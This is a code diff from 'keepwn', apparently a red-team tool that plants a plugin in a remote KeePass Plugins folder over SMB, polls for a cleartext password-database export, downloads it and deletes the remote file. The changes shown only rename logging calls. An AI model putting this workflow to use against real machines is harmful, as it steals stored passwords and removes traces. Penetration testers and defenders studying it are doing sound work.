@@ -6,8 +6,7 @@ from time import sleep
 
 from impacket.smbconnection import SessionError
 
-from keepwn.utils.logging import print_error, print_info, print_success, print_alert, print_found_plugins, Loader, \
-    print_found_plugin_directory, print_copied_export, print_found_export
+from keepwn.utils.logging import print_error, print_info, print_success, print_warning, print_found_plugins, Loader, format_path
 from keepwn.utils.parser import parse_mandatory_options
 from keepwn.utils.smb import smb_connect
 
@@ -17,7 +16,7 @@ def get_plugin_folder_path(smb_connection, share, plugin_path):
         if plugin_path.startswith('\\\\') and '$' in plugin_path:
             plugin_path = plugin_path.split('$')[1]
         if not plugin_path.endswith('KeePass Password Safe 2\\Plugins'):
-            print_alert("Specified path does not look like a plugin path, do you want to use it [y/n]")
+            print_warning("Specified path does not look like a plugin path, do you want to use it [y/n]")
             ans = input('> ')
             if ans.lower() not in ['y', 'yes', '']:
                 exit(0)
@@ -30,7 +29,7 @@ def get_plugin_folder_path(smb_connection, share, plugin_path):
     except SessionError as e:
         print_error("Unable to find KeePass plugin folder")
         return None
-    print_found_plugin_directory('\\\\{}{}'.format(share, plugin_path))
+    print_info("Found KeePass Plugins directory {}".format(format_path('\\\\{}{}'.format(share, plugin_path))))
     return plugin_path
 
 def get_plugins(smb_connection, share, plugin_path):
@@ -82,7 +81,7 @@ def add_plugin(options):
         exit()
 
     if not (options.plugin.lower().endswith('dll') or options.plugin.lower().endswith('plgx')):
-        print_alert("The specified plugin file does not look like a plugin, do you want to use it anyway? [y/n]")
+        print_warning("The specified plugin file does not look like a plugin, do you want to use it anyway? [y/n]")
         ans = input('> ')
         if ans.lower() not in['y', 'yes', '']:
             exit(0)
@@ -110,9 +109,9 @@ def add_plugin(options):
             found_plugin = True
 
     if found_plugin:
-        print_alert("Plugin already added to KeePass Plugin directory, do you want to overwrite? [y/n]".format(plugin_file))
+        print_warning("Plugin already added to KeePass Plugin directory, do you want to overwrite? [y/n]".format(plugin_file))
     else:
-        print_alert("About to add {} to KeePass Plugin directory, do you want to continue? [y/n]".format(plugin_file))
+        print_warning("About to add {} to KeePass Plugin directory, do you want to continue? [y/n]".format(plugin_file))
     ans = input('> ')
     if ans.lower() not in ['y', 'yes', '']:
         exit(0)
@@ -173,10 +172,10 @@ def clean_plugin(options):
             found_plugin = True
 
     if not found_plugin:
-        print_alert("Plugin not found in KeePass Plugin directory, aborting deletion".format(plugin_file))
+        print_warning("Plugin not found in KeePass Plugin directory, aborting deletion".format(plugin_file))
         exit()
     else:
-        print_alert("About to remove {} from KeePass Plugin directory, do you want to continue [y/n]".format(plugin_file))
+        print_warning("About to remove {} from KeePass Plugin directory, do you want to continue [y/n]".format(plugin_file))
         ans = input('> ')
         if ans.lower() not in ['y', 'yes', '']:
             exit(0)
@@ -224,7 +223,7 @@ def poll_plugin(options):
 
     export_path = None
     try:
-        with Loader("[>] Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort"):
+        with Loader("Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort. DONE"):
             while not export_path:
                 try:
                     for file in smb_connection.listPath(share, '\\Users\\*'):
@@ -242,7 +241,7 @@ def poll_plugin(options):
     except KeyboardInterrupt:
         exit()
 
-    print_found_export('\\\\{}\\{}'.format(share, export_path))
+    print_success("Found cleartext export {}".format(format_path('\\\\{}\\{}'.format(share, export_path))))
 
     try:
         buffer = BytesIO()
@@ -253,6 +252,6 @@ def poll_plugin(options):
             f.write(buffer.getbuffer())
 
         smb_connection.deleteFile(share, export_path)
-        print_copied_export(local_path)
+        print_success("Moved remote export to {}".format(format_path(local_path)))
     except:
         print_error("Unkown error while getting export.")
